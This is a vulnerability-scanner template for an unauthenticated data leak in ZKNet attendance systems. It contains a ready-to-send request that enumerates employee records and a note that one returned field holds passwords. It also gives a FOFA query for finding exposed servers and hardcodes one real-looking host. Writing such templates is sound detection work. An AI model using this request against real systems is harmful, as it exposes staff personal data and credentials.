id: zknet-unauth-infoleak

info:
  name: ZKNet Unauthenticated Information Disclosure
  author: qwtd
  severity: high
  description: |
    影响zknet 9.x版本，可以通过遍历UserID__id__exact的值获取敏感信息，MVerifyPass为密码
    fofa: title="ZKNet考勤管理系统"
  reference:
    - https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-095987
  tags: ZKTECO-时间精细化管理平台

http:
  - raw:
      - |
        POST /iclock/staff/employee/?UserID__id__exact=1&fromTime=&toTime= HTTP/1.1
        x-requested-with: XMLHttpRequest
        Accept-Language: zh-cn
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 3.0.04320; .NET CLR 2.0.50727)
        Host: kaoqin.sugon.com
        Content-Length: 0
        Proxy-Connection: Keep-Alive
        Pragma: no-cache
        Cookie:
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'DeptID'
          - 'EName'
          - 'Mobile'
      - type: status
        status:
          - 200